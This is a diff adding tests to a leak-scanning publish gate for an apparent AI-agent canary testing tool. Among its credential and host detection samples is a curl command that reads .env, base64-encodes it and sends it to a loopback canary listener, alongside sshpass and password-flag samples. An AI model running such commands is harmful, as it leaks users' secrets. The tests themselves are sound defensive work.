@@ -20,6 +20,8 @@ import {
   type GateAllow,
   type LeakKind,
 } from '../src/report/publish.js';
+import { main, type CliDeps } from '../src/cli.js';
+import { BASE_ENV_ALLOW, ENV_VALUE_EXEMPT } from '../src/adapters/childEnv.js';
 import { loadScenarioDir } from '../src/scenario/load.js';
 import { corpusDigest } from '../src/scenario/digest.js';
 import type { EvidenceRecord, RunManifest } from '../src/runner/types.js';
@@ -80,7 +82,7 @@ describe('gate patterns (ADR-0017 "Gate patterns")', () => {
     ['double percent-encoded home', '%252Fhome%252Fsomeone', ['home_path']],
     // Second adversarial pass: other URL schemes, separators and internal addresses.
     ['ftp:// URL', 'ftp://files.acme.dev/x', ['url']],
-    ['database URL with credentials', 'postgres://u:p@db.acme.io/app', ['url']],
+    ['database URL with credentials', 'postgres://u:p@db.acme.io/app', ['credential', 'url']],
     ['smb:// URL on an internal host', 'smb://fileserver.corp/share', ['url']],
     ['sftp:// URL', 'sftp://deploy.acme.dev/up', ['ssh_url']],
     ['backslash scheme separator', 'https:\\\\evil-host.com/x', ['url']],
@@ -88,6 +90,30 @@ describe('gate patterns (ADR-0017 "Gate patterns")', () => {
     ['protocol-relative URL', 'src=//evil-host.com/x', ['host']],
     ['private IPv4 without a port', 'gateway 192.168.1.1 and 10.0.0.5', ['host']],
     ['CGNAT IPv4 without a port', 'peer 100.101.102.103 joined', ['host']],
+    // Block B12 (ADR-0017 amendment 2026-11-05): credential shapes by context, address gaps.
+    ['MySQL glued -p<value> and a credential assignment', `mysql -u root -p${'S3cret'}Passw0rd! -h db && export DB_${'PASSWORD'}=${rep('h2', 6)}`, ['credential']],
+    ['credential assignment alone', `set API_${'TOKEN'}=${rep('Ab1', 4)}`, ['credential']],
+    ['scheme-less query with a base64 blob (requested path)', `{"requested":"/c/tok?k=${Buffer.from(`AWS_${'SECRET'}=abcdefghijklmnopqrstuvwxyz`).toString('base64')}"}`, ['credential']],
+    ['--password= flag', `pg_dump --password=${rep('Pw1', 4)} db`, ['credential']],
+    ['--token flag with a space', `cli login --token ${rep('Tk9', 4)}`, ['credential']],
+    ['sshpass -p', `sshpass -p ${rep('s3', 4)} ssh host`, ['credential']],
+    ['JSON member of the credential family', `{"API_${'TOKEN'}": "${rep('Zq7', 4)}"}`, ['credential']],
+    ['JSON member with escaped quotes inside a string', `"{\\"api_${'key'}\\": \\"${rep('Zq7', 4)}\\"}"`, ['credential']],
+    ['URL userinfo password on loopback', `curl http://admin:${rep('p4', 4)}@127.0.0.1:8080/`, ['credential']],
+    ['40-hex blob in a loopback URL query', `http://127.0.0.1:1/x?s=${rep('ab12', 10)}`, ['credential']],
+    ['base64 blob in a loopback URL path segment', `http://127.0.0.1:1/x/${rep('Ab1', 14)}/y`, ['credential']],
+    ['scp to a private IPv4', 'scp . deploy@10.0.0.5:/srv', ['git_ssh', 'host']],
+    ['ssh to a private IPv4', 'ssh deploy@10.0.0.5', ['host']],
+    ['IPv4-mapped IPv6 spelling of a private IPv4', 'ssh ::ffff:10.0.0.7', ['host']],
+    ['rsync to a private IPv4 remote', 'rsync -a . backup@10.20.30.40:/mnt', ['git_ssh', 'host']],
+    ['scp-style remote on a public IPv4', 'rsync -a . backup@203.0.113.40:/mnt', ['git_ssh']],
+    ['IPv6 unique-local literal', 'fd12:3456::1', ['host']],
+    ['IPv6 link-local literal', 'fe80::1', ['host']],
+    ['bracketed IPv6 unique-local with a port', 'nc [fd12::1]:22', ['host']],
+    ['ssh to an IPv6 unique-local literal', 'ssh user@fd12:3456::1', ['host']],
+    ['single-label host with a port and a path', 'curl gitlab:8443/api', ['host']],
+    ['single-label host with a port', 'redis:6379', ['host']],
+    ['single-label host with a port in JSON', '{"host":"db:5432"}', ['host']],
   ];
   it.each(positives)('flags %s', (_label, text, kinds) => {
     expect(kindsOf(text)).toEqual(kinds);
@@ -125,6 +151,21 @@ describe('gate patterns (ADR-0017 "Gate patterns")', () => {
     ['dotted version numbers that contain a private-range quad', 'v10.0.0.5000 and 1.10.0.0.5'],
     ['public IPv4 without a port', 'documentation range 203.0.113.7'],
     ['code comment slashes', 'a // foo.com is b'],
+    // Block B12 negatives.
+    ['bare -p flags', 'mkdir -p dir && claude -p "task" && find . -print'],
+    ['assignment of a variable reference', `${'TOKEN'}=$GITHUB_${'TOKEN'}`],
+    ['assignment of a canary pseudonym', `${'PASSWORD'}=<canary-token-1>`],
+    ['assignment of an x placeholder', `API_${'KEY'}=xxxxxxxxxxxx`],
+    ['assignment of a REDACTED placeholder', `DB_${'SECRET'}="REDACTED_VALUE"`],
+    ['JSON member holding a pseudonym', '{"token": "<canary-token-2>"}'],
+    ['flag word in prose', 'the canary-token rewrite runs before the gate; --token is required'],
+    ['digests at their keys', `scenario_version: sha256:${rep('ab', 32)} "input_digest": "${rep('9f', 32)}"`],
+    ['Markdown anchor in a loopback URL fragment', `http://127.0.0.1:1/doc#${'section-'.repeat(8)}end`],
+    ['curl command text with a shell substitution', 'curl http://127.0.0.1:39085/c/<canary-token-1>?k=$(cat .env | base64)'],
+    ['public IPv4 without a port (unchanged decision)', 'ping 203.0.113.9'],
+    ['IPv6 loopback and a global IPv6 literal', '::1 and 2001:db8::1'],
+    ['clock times, drive letters, counters, digests and file:line refs', 'at 12:30 and C:123 and retry:3 and sha256:abcd and "port":8080 and file.ts:12 and T07:10:18Z'],
+    ['loopback single-label host with a port', 'localhost:3000'],
   ];
   it.each(negatives)('does not flag %s', (_label, text) => {
     expect(kindsOf(text)).toEqual([]);
@@ -145,6 +186,34 @@ describe('gate patterns (ADR-0017 "Gate patterns")', () => {
     const value = `${'ghp'}_${rep('Z9', 18)}`;
     const leaks = scanForLeaks([{ rel: 'a', text: value }], ALLOW);
     expect(JSON.stringify(leaks)).not.toContain(value);
+  });
+
+  it('B12: credential findings name the shape, never the value', () => {
+    const value = rep('S3cr', 5);
+    const text = `mysql -p${value}; export DB_${'PASSWORD'}=${value}; --password=${value}; http://u:${value}@127.0.0.1/; {"API_${'TOKEN'}": "${value}"}`;
+    const leaks = scanForLeaks([{ rel: 'a', text }], ALLOW);
+    expect(leaks.length).toBeGreaterThanOrEqual(5);
+    expect(leaks.every((l) => l.kind === 'credential')).toBe(true);
+    expect(JSON.stringify(leaks)).not.toContain(value);
+  });
+
+  it('B12: a blob in detector_hits[].matched.args / argv / requested is read structurally from an evidence record', () => {
+    const blob = Buffer.from(`AWS_${'SECRET'}=abcdefghijklmnopqrstuvwxyz0123`).toString('base64');
+    const rec = (matched: Record<string, unknown>) =>
+      JSON.stringify({ detector_hits: [{ detector: 'canary_mcp_tool', matched, evidence_ref: 'x', at: 1 }] });
+    const kinds = (text: string, rel = 'A/0/evidence.json') => scanForLeaks([{ rel, text }], ALLOW).map((l) => `${l.kind}: ${l.detail}`);
+    expect(kinds(rec({ tool: 't', token: '<canary-token-1>', args: { nested: [{ v: blob }] } }))).toEqual(['credential: encoded blob in detector field matched.args']);
+    expect(kinds(rec({ command: 'c', argv: ['--run', rep('ab12', 10)] }))).toEqual(['credential: encoded blob in detector field matched.argv']);
+    expect(kinds(rec({ requested: `/c/<canary-token-1>/${rep('Ab1', 14)}` }))).toEqual(['credential: encoded blob in detector field matched.requested']);
+    // Pseudonyms, a flag-like run (`--`) and a lower-case slug are not blobs; digests sit at other keys.
+    expect(kinds(rec({ args: ['<canary-token-1>', `--${'a-'.repeat(25)}`, 'a-slug-of-lower-case-words-and-hyphens-only-1'], scenario_version: rep('ab', 32) }))).toEqual([]);
+    // The same text in a file that is not an evidence record is judged by the text rules only.
+    expect(kinds(rec({ args: { v: blob } }), 'report.json')).toEqual([]);
+  });
+
+  it('B12: --allow-host opens a single-label host, a private IPv6 literal and an IPv4 remote', () => {
+    const allow: GateAllow = { urls: new Set(), hosts: new Set(['gitlab', 'fd12:3456::1', '203.0.113.40']) };
+    expect(kindsOf('curl gitlab:8443/api and fd12:3456::1 and backup@203.0.113.40:/mnt', allow)).toEqual([]);
   });
 });
 
@@ -302,6 +371,122 @@ describe('planPublish: allow-URL, username, canaries, corpus block', () => {
   });
 });
 
+describe('B12 operator values (env_value) and evidence count', () => {
+  const VALUE = `${'Op'}${rep('x7', 11)}`; // 24 characters, built at runtime
+  const spellings = (v: string): Record<string, string> => ({
+    raw: v,
+    json: JSON.stringify(v).slice(1, -1),
+    percent: encodeURIComponent(v),
+    base64: Buffer.from(v).toString('base64'),
+    base64url: Buffer.from(v).toString('base64url'),
+    unpadded: Buffer.from(v).toString('base64').replace(/=+$/, ''),
+  });
+  const withEnv = (forwarded: string[] | undefined, note: string) => {
+    const c = contents({ 'AAB-002': note });
+    c.evidence = c.evidence.map((f) => {
+      const rec = JSON.parse(f.text) as EvidenceRecord;
+      if (forwarded) rec.observation!.env_forwarded = forwarded;
+      return { rel: f.rel, text: JSON.stringify(rec, null, 2) };
+    });
+    return c;
+  };
+  const leaksOf = (plan: ReturnType<typeof planPublish>) => (plan.ok ? [] : plan.leaks.map((l) => `${l.file}: ${l.kind}: ${l.detail}`));
+
+  it.each(Object.entries(spellings(`${VALUE}+/=`)))('finds the %s spelling of a forwarded value and names only the variable', (_label, spelled) => {
+    const value = `${VALUE}+/=`;
+    const plan = planPublish(withEnv(['ANTHROPIC_API_KEY', 'PATH'], `echo ${spelled}`), { corpus: SHIPPED, operatorEnv: { ANTHROPIC_API_KEY: value } });
+    expect(leaksOf(plan)).toEqual(['AAB-002/0/evidence.json: env_value: value of environment variable ANTHROPIC_API_KEY present (value redacted)']);
+    expect(JSON.stringify(plan)).not.toContain(value);
+  });
+
+  it('no finding for a name absent from env_forwarded, a process basic, an exempt name, a short value, the model, or a replay record', () => {
+    const base = BASE_ENV_ALLOW.names![0];
+    const exempt = ENV_VALUE_EXEMPT[0];
+    const ok = (forwarded: string[] | undefined, env: Record<string, string>, note = `echo ${VALUE}`) => planPublish(withEnv(forwarded, note), { corpus: SHIPPED, operatorEnv: env }).ok;
+    expect(ok(['OTHER_NAME'], { ANTHROPIC_API_KEY: VALUE })).toBe(true);
+    expect(ok([base], { [base]: VALUE })).toBe(true);
+    expect(ok([exempt], { [exempt]: VALUE })).toBe(true);
+    expect(ok(['ANTHROPIC_API_KEY'], { ANTHROPIC_API_KEY: 'abcdefg' }, 'echo abcdefg')).toBe(true);
+    expect(ok(['ANTHROPIC_API_KEY'], { ANTHROPIC_API_KEY: 'claude-opus-4-8' }, 'echo claude-opus-4-8')).toBe(true);
+    expect(ok(undefined, { ANTHROPIC_API_KEY: VALUE })).toBe(true);
+    // Control: the same note with the name forwarded is a finding.
+    expect(ok(['ANTHROPIC_API_KEY'], { ANTHROPIC_API_KEY: VALUE })).toBe(false);
+  });
+
+  it('settings env values are checked for every name; a dropped scenario\'s values are not', () => {
+    const c = contents({ 'AAB-002': `echo ${VALUE}` });
+    const plan = planPublish({ ...c, settingsEnv: [{ rel: 'AAB-001/0/claude-settings.json', name: 'MY_PROXY_PASS', value: VALUE }] }, { corpus: SHIPPED });
+    expect(leaksOf(plan)).toEqual(['AAB-002/0/evidence.json: env_value: value of environment variable MY_PROXY_PASS present (value redacted)']);
+    const dropped = planPublish({ ...c, settingsEnv: [{ rel: 'AAB-001/0/claude-settings.json', name: 'MY_PROXY_PASS', value: VALUE }] }, { corpus: SHIPPED, withhold: ['AAB-001'] });
+    expect(dropped.ok).toBe(true);
+  });
+
+  it('evidence count: fewer files than planned repetitions warns; none refuses unless --allow-no-evidence', () => {
+    const m = manifest();
+    m.results[0].runs = 3;
+    m.results[0].confidence = '0/3 vulnerable';
+    const c = contents({}, m);
+    const one = planPublish({ ...c, evidence: c.evidence.slice(0, 1) }, { corpus: SHIPPED, runDir: 'runs/x' });
+    expect(one.ok).toBe(true);
+    if (one.ok) {
+      expect(one.warnings).toEqual(['publish: 1 evidence file(s) for 4 planned repetition(s); report.md cites evidence files that are not in the bundle']);
+      expect(one.evidenceFound).toBe(1);
+      expect(one.evidenceExpected).toBe(4);
+    }
+    const none = planPublish({ ...c, evidence: [] }, { corpus: SHIPPED, runDir: 'runs/x' });
+    expect(none.ok).toBe(false);
+    if (!none.ok) {
+      expect(none.error).toBe('no evidence files under runs/x (0 of 4 planned repetitions); a bundle without evidence cannot be audited');
+      expect(none.next).toBe('lurekit publish runs/x --allow-no-evidence   (report-only copy, e.g. the shipped demo)');
+      expect(none.leaks).toEqual([]);
+    }
+    const allowed = planPublish({ ...c, evidence: [] }, { corpus: SHIPPED, runDir: 'runs/x', allowNoEvidence: true });
+    expect(allowed.ok).toBe(true);
+    if (allowed.ok) {
+      expect(allowed.files.map((f) => f.rel)).toEqual(['manifest.json', 'report.md', 'report.json', 'report.sarif', 'index.md']);
+      expect(allowed.files.find((f) => f.rel === 'index.md')!.text).toContain(
+        '## Evidence\n\nno evidence files published (--allow-no-evidence): 0 of 4 planned repetition(s); the evidence lines in report.md cite files that are not in this bundle',
+      );
+      expect(allowed.warnings).toEqual([]);
+    }
+    // Full evidence (the unmodified manifest: one file per planned repetition): no warning, and
+    // the flag changes no byte.
+    const full = planPublish(contents(), { corpus: SHIPPED });
+    const flagged = planPublish(contents(), { corpus: SHIPPED, allowNoEvidence: true });
+    expect(full.ok && flagged.ok).toBe(true);
+    if (full.ok && flagged.ok) {
+      expect(full.warnings).toEqual([]);
+      expect(flagged.files).toEqual(full.files);
+      expect(full.files.find((f) => f.rel === 'index.md')!.text).not.toContain('## Evidence');
+    }
+  });
+});
+
+describe('B12 schema descriptions and entry-page wording (DOCS-03, DOCS-14)', () => {
+  it('manifest.schema.json describes `excluded` as dropped from corpus.scenario_ids and documents corpus_digest_full', () => {
+    const schema = JSON.parse(readFileSync(path.join(ROOT, 'schemas', 'manifest.schema.json'), 'utf8')) as {
+      properties: { excluded: { description: string }; corpus: { properties: { corpus_digest_full: { description?: string } } } };
+    };
+    expect(schema.properties.excluded.description).not.toContain('stays in');
+    expect(schema.properties.excluded.description).toContain('from corpus.scenario_ids');
+    expect(schema.properties.corpus.properties.corpus_digest_full.description).toContain('Published reduced bundles only');
+  });
+
+  it('README, the launch article and the publishing guide state what the gate checks', () => {
+    const readme = readFileSync(path.join(ROOT, 'README.md'), 'utf8');
+    const article = readFileSync(path.join(ROOT, 'docs', 'launch', 'article-lurekit-2026-11.md'), 'utf8');
+    const guide = readFileSync(path.join(ROOT, 'docs', 'guide', 'publishing.md'), 'utf8');
+    for (const text of [readme, article, guide]) {
+      expect(text).not.toContain('keeps those inputs safe');
+      expect(text).not.toMatch(/non-allowlisted hosts,\s+credential-shaped tokens and home paths/);
+      expect(text).toContain('not exactly a scenario source URL');
+    }
+    expect(guide).toMatch(/^\| `credential` \|/m);
+    expect(guide).toMatch(/^\| `env_value` \|/m);
+    expect(guide).toContain('--allow-no-evidence');
+  });
+});
+
 describe('pseudonymizeMcpServers numbering (no per-name Set rebuild)', () => {
   it('assigns increasing placeholders, skipping reserved ones, for many names', () => {
     const servers = Array.from({ length: 3000 }, (_, i) => ({ name: `srv-${i}`, status: 'connected', source: 'user' }));
@@ -366,6 +551,69 @@ describe('readRunDir never follows symlinks (ADR-0017 "Run-dir reading")', () =>
       'publish: skipped symlink AAB-002/0 (symlinks in a run dir are never followed)',
       'publish: skipped symlink AAB-002/1/evidence.json (symlinks in a run dir are never followed)',
     ]);
+  });
+
+  it('B12: harvests the settings env of kept repetitions only; a symlinked file is skipped, invalid JSON fails closed', (ctx) => {
+    const run = path.join(tmp, 'run');
+    for (const id of ['AAB-001', 'AAB-002']) {
+      mkdirSync(path.join(run, id, '0'), { recursive: true });
+      writeFileSync(path.join(run, id, '0', 'evidence.json'), '{}');
+    }
+    writeFileSync(path.join(run, 'manifest.json'), JSON.stringify(manifest()));
+    writeFileSync(path.join(run, 'AAB-001', '0', 'claude-settings.json'), JSON.stringify({ env: { A_SECRET_VALUE: 'value-one', NUM: 1 }, hooks: {} }));
+    writeFileSync(path.join(run, 'AAB-002', '0', 'claude-settings.json'), JSON.stringify({ env: { B_VALUE: 'value-two' } }));
+    const c = readRunDir(run);
+    expect(c.settingsEnv).toEqual([
+      { rel: 'AAB-001/0/claude-settings.json', name: 'A_SECRET_VALUE', value: 'value-one' },
+      { rel: 'AAB-002/0/claude-settings.json', name: 'B_VALUE', value: 'value-two' },
+    ]);
+    expect(c.evidence.map((e) => e.rel)).toEqual(['AAB-001/0/evidence.json', 'AAB-002/0/evidence.json']);
+    // A withheld/excluded scenario's settings file is not read.
+    expect(readRunDir(run, { skipScenarios: ['AAB-001'] }).settingsEnv).toEqual([{ rel: 'AAB-002/0/claude-settings.json', name: 'B_VALUE', value: 'value-two' }]);
+    // Symlink: skipped with the usual warning, nothing harvested from it.
+    writeFileSync(path.join(tmp, 'outside.json'), JSON.stringify({ env: { LEAK: 'outside-value' } }));
+    rmSync(path.join(run, 'AAB-002', '0', 'claude-settings.json'));
+    trySymlink(path.join(tmp, 'outside.json'), path.join(run, 'AAB-002', '0', 'claude-settings.json'), ctx);
+    const linked = readRunDir(run);
+    expect(linked.settingsEnv).toEqual([{ rel: 'AAB-001/0/claude-settings.json', name: 'A_SECRET_VALUE', value: 'value-one' }]);
+    expect(linked.warnings).toEqual(['publish: skipped symlink AAB-002/0/claude-settings.json (symlinks in a run dir are never followed)']);
+    expect(JSON.stringify(linked)).not.toContain('outside-value');
+    // Invalid JSON fails closed.
+    writeFileSync(path.join(run, 'AAB-001', '0', 'claude-settings.json'), '{ not json');
+    expect(() => readRunDir(run)).toThrow(/AAB-001\/0\/claude-settings\.json is not valid JSON/);
+  });
+
+  it('B12: the shipped demo dir (no evidence files) is refused without --allow-no-evidence and published with it', async () => {
+    const out: string[] = [];
+    const err: string[] = [];
+    const deps: CliDeps = {
+      now: () => '2026-11-05T00:00:00.000Z',
+      newRunId: () => 'aab-unused',
+      adapterFor: () => {
+        throw new Error('publish must not need an adapter');
+      },
+      cwd: () => ROOT,
+      stdout: (s) => out.push(s),
+      stderr: (s) => err.push(s),
+      homeDir: () => '/home/lurekit-maintainer',
+      env: () => ({}),
+    };
+    const demo = path.join('demo', 'aab-20261103071018-88a78d8f');
+    const outDir = path.join(tmp, 'demo-bundle');
+    const before = readdirSync(path.join(ROOT, demo)).sort();
+    expect(await main(['publish', demo, '--out', outDir], deps)).toBe(1);
+    expect(err.join('')).toBe(
+      `publish: no evidence files under ${demo} (0 of 63 planned repetitions); a bundle without evidence cannot be audited; nothing written\n` +
+        `next: lurekit publish ${demo} --allow-no-evidence   (report-only copy, e.g. the shipped demo)\n`,
+    );
+    expect(existsSync(outDir)).toBe(false);
+    expect(await main(['publish', demo, '--out', outDir, '--allow-no-evidence'], deps)).toBe(0);
+    expect(err.join('')).toMatch(/nothing written\n$/); // only the first attempt wrote to stderr
+    const text = out.join('');
+    expect(text).toContain('evidence: 0 of 63 file(s) (--allow-no-evidence)\n');
+    expect(text).toContain(`\nNext: lurekit report ${outDir}\n      cite it as described in the publishing guide ("Citing a bundle")\n`);
+    expect(readFileSync(path.join(outDir, 'index.md'), 'utf8')).toContain('## Evidence\n\nno evidence files published (--allow-no-evidence): 0 of 63');
+    expect(readdirSync(path.join(ROOT, demo)).sort()).toEqual(before); // never touched
   });
 
   it('a symlinked manifest.json is an error', (ctx) => {
